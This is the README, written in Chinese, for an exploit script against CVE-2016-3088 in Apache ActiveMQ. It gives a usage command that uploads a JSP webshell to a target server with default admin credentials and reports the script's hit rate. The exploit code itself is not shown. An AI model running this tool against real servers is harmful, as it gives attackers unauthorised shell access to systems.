# ActiveMQ的PUT 上传getshellExP CVE-2016-3088

Author:CF_HB

时间：2016年6月8日

漏洞参考地址: http://zone.wooyun.org/content/27737

exp使用例子：
原理参见zone里白帽子刺刺的分析，上传shell用法如下：
    python ActiveMQExP.py -url http://192.168.18.133:8161/ -user admin -pass admin -shell D://shell.jsp

经过几何牛各种测试，命中率应该及格了，欢迎大家继续测试和反馈bug。
